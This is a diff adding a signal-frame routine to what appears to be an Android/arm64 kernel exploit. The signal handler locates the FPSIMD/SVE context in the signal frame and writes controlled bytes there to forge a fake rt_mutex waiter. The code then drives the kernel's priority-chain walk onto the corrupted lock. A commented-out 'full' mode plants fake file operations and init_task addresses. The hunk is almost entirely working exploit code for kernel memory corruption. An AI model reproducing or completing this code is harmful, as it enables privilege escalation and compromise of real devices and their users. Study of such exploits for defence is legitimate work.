@@ -18,6 +18,201 @@ atomic_int pipe_prepare_request;
 atomic_int pipe_prepare_done;
 int memfd_leak;
 
+
+
+/* === SIGRETURN FPSIMD ISOLATED TEST === */
+#include <signal.h>
+#include <stddef.h>
+#include <asm/sigcontext.h>
+
+#define SIGRETURN_MODE_SAFE   0
+#define SIGRETURN_MODE_GHOST  1
+#define SIGRETURN_MODE_FULL   2
+
+static volatile int sigreturn_done = 0;
+static unsigned char g_fake_waiter[0x58];
+static int sigreturn_mode = SIGRETURN_MODE_GHOST;
+
+static int sigreturn_found_fpsimd = 0;
+static int sigreturn_found_sve = 0;
+static uintptr_t sigreturn_target_addr = 0;
+
+static void sigreturn_handler(int sig, siginfo_t *info, void *ucontext)
+{
+    (void)sig; (void)info;
+    ucontext_t *uc = (ucontext_t *)ucontext;
+    struct sigcontext *sc = (struct sigcontext *)&uc->uc_mcontext;
+
+    /* __reserved starts at offset 0x120 from sigcontext start
+       (fault_address 8 + regs[31] 248 + sp 8 + pc 8 + pstate 8 + pad 8 = 288) */
+    unsigned char *base = (unsigned char *)sc + offsetof(struct sigcontext, __reserved);
+
+    sigreturn_found_fpsimd = 0;
+    sigreturn_found_sve = 0;
+    sigreturn_target_addr = 0;
+
+    for (int off = 0; off < 4096; ) {
+        uint32_t magic = *(uint32_t *)(base + off);
+        uint32_t size  = *(uint32_t *)(base + off + 4);
+
+        if (magic == 0 && size == 0)
+            break;
+        if (magic == 0) {
+            off += 8;
+            continue;
+        }
+
+        if (magic == FPSIMD_MAGIC) {
+            sigreturn_found_fpsimd = 1;
+            struct fpsimd_context *fpsimd = (struct fpsimd_context *)(base + off);
+            uintptr_t vregs = (uintptr_t)&fpsimd->vregs[0];
+
+            /* Peek next record for SVE */
+            int next_off = off + size;
+            if (next_off + 8 <= 4096) {
+                uint32_t next_magic = *(uint32_t *)(base + next_off);
+                if (next_magic == SVE_MAGIC)
+                    sigreturn_found_sve = 1;
+            }
+
+            int waiter_off = sigreturn_found_sve ? 0x28 : 0x18;
+            sigreturn_target_addr = vregs + waiter_off;
+
+            pr_info("sigreturn ctx fpsimd=%d sve=%d vregs=%016zx waiter_off=+%02x target=%016zx mode=%d\n",
+                    sigreturn_found_fpsimd, sigreturn_found_sve,
+                    vregs, waiter_off, sigreturn_target_addr, sigreturn_mode);
+
+            if (sigreturn_mode == SIGRETURN_MODE_SAFE) {
+                sigreturn_done = 1;
+                return;
+            }
+
+            uint8_t *dst = (uint8_t *)sigreturn_target_addr;
+
+            if (sigreturn_mode == SIGRETURN_MODE_GHOST) {
+                /* Controlled panic test: zero out waiter->lock */
+                uint64_t controlled[10];
+                memset(controlled, 0, sizeof(controlled));
+                controlled[6] = 0;  /* waiter->lock at offset +0x38 = vregs + 0x50 */
+                memcpy(dst, controlled, sizeof(controlled));
+            }
+
+            sigreturn_done = 1;
+            return;
+        }
+
+        if (size == 0)
+            break;
+        off += size;
+    }
+}
+
+/* fallback если pselect_write_value/target не видны */
+#ifndef pselect_write_value
+static uint64_t pselect_write_value(void) { return 0; }
+static uint64_t pselect_write_target(void) { return 0; }
+#endif
+
+void do_sigreturn_fake_lock_route(void)
+{
+    const char *mode_env = getenv("SIGRETURN_MODE");
+    if (mode_env && strcmp(mode_env, "safe") == 0) {
+        sigreturn_mode = SIGRETURN_MODE_SAFE;
+    } else if (mode_env && strcmp(mode_env, "ghost") == 0) {
+        sigreturn_mode = SIGRETURN_MODE_GHOST;
+    } else {
+        sigreturn_mode = SIGRETURN_MODE_FULL;
+    }
+
+    if (sigreturn_mode == SIGRETURN_MODE_FULL) {
+      /*
+        if (!page_base || !fake_lock || !fake_fops) {
+            pr_error("sigreturn full mode missing page=%016zx lock=%016zx fops=%016zx\n",
+                     page_base, fake_lock, fake_fops);
+            return;
+        }
+        memset(g_fake_waiter, 0, sizeof(g_fake_waiter));
+        put_fake_waiter(g_fake_waiter, 0,
+                        1, 0, 0,
+                        fake_fops,
+                        data_addr(ASHMEM_MISC_FOPS),
+                        0,
+                        text_addr(INIT_TASK),
+                        fake_lock,
+                        FAKE_WAITER_PRIO);
+                        */
+    } else {
+        pr_info("sigreturn isolated test mode=%s\n",
+                sigreturn_mode == SIGRETURN_MODE_SAFE ? "safe" : "ghost");
+    }
+
+    struct sigaction sa = {0};
+    sa.sa_sigaction = sigreturn_handler;
+    sa.sa_flags = SA_SIGINFO | SA_RESTART;
+    sigaction(SIGUSR1, &sa, NULL);
+
+    usleep(50000);
+
+    int tid = atomic_load(&waiter_tid);
+    if (tid <= 0) {
+        pr_error("sigreturn route no waiter tid\n");
+        return;
+    }
+
+    sigreturn_done = 0;
+    syscall(SYS_tgkill, getpid(), tid, SIGUSR1);
+
+    while (!sigreturn_done)
+        sched_yield();
+
+    if (sigreturn_mode == SIGRETURN_MODE_FULL) {
+      /*
+        atomic_store(&punch_consume_go, 1);
+        int waited = 0;
+        while (waited < 500000) {
+            int c = atomic_load(&consumer_calls);
+            int s = atomic_load(&consumer_success);
+            if (c > 0 && s > 0)
+                break;
+            if (cfi_dirty_seen)
+                break;
+            usleep(1000);
+            waited += 1000;
+        }
+        atomic_store(&punch_consume_go, 0);
+        pr_info("sigreturn full mode done calls=%d success=%d\n",
+                atomic_load(&consumer_calls), atomic_load(&consumer_success));
+                */
+    } else if (sigreturn_mode == SIGRETURN_MODE_GHOST) {
+        /* Trigger rt_mutex_adjust_prio_chain to read corrupted waiter->lock */
+        atomic_store(&punch_consume_go, 1);
+        int waited = 0;
+        while (waited < 200000) {
+            if (cfi_dirty_seen) break;
+            usleep(1000);
+            waited += 1000;
+        }
+        atomic_store(&punch_consume_go, 0);
+        pr_info("sigreturn ghost mode done\n");
+        // info
+        pr_info("sigreturn isolated test complete fpsimd=%d sve=%d target=%016zx\n",
+                sigreturn_found_fpsimd, sigreturn_found_sve, sigreturn_target_addr);
+    } 
+    else { // SAFE mode
+        usleep(100000);
+        pr_info("sigreturn isolated test complete fpsimd=%d sve=%d target=%016zx\n",
+                sigreturn_found_fpsimd, sigreturn_found_sve, sigreturn_target_addr);
+    }
+}
+/* === END SIGRETURN REPRO === */
+
+
+
+
+
+
+
+
 void *waiter_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
 
